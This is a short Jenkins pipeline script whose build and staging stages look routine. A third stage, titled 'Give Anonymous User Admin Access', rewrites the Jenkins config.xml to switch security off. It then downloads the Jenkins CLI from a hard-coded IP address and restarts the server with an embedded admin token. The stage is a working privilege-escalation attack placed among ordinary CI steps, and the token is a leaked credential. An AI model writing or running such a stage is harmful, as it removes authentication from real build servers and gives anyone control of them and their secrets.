node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Give Anonymous User Admin Access') {
      sh '''
      sed -i 's/<useSecurity>true<\\/useSecurity>/<useSecurity>false<\\/useSecurity>/g' /var/lib/jenkins/config.xml
      wget http://35.212.165.95:8080/jnlpJars/jenkins-cli.jar
          chmod 777 jenkins-cli.jar
      java -jar jenkins-cli.jar -s http://35.212.165.95:8080/ -auth admin:119fa8e26f44cf5ceed5fabfd69dbc4528 restart
      '''
      
    }
}